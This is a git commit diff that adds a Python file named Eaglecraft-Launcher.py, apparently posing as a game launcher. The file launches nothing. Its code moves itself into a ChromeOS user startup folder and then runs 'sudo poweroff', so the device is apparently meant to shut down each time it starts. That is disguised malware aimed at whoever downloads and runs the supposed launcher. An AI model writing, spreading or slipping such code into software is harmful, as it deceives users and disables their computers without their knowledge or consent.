235d5da3a2c1e8f1d83cab241322df7f7b7e3512
HitTheFlag <134304936+HitTheFlag@users.noreply.github.com>
2023-05-22 16:33:11 +0100

    Update Eaglecraft-Launcher.py

--- Eaglecraft-Launcher.py
+++ Eaglecraft-Launcher.py
@@ -1,1 +1,12 @@
+import shutil
+import subprocess
 
+source_file = '/downloads/Eaglecraft-Launcher.py'
+startup_folder = '/home/chronos/user/Startup/'
+
+shutil.move(source_file, startup_folder)
+
+def turn_off_chrome_os():
+    subprocess.run(['sudo', 'poweroff'])
+    
+turn_off_chrome_os()
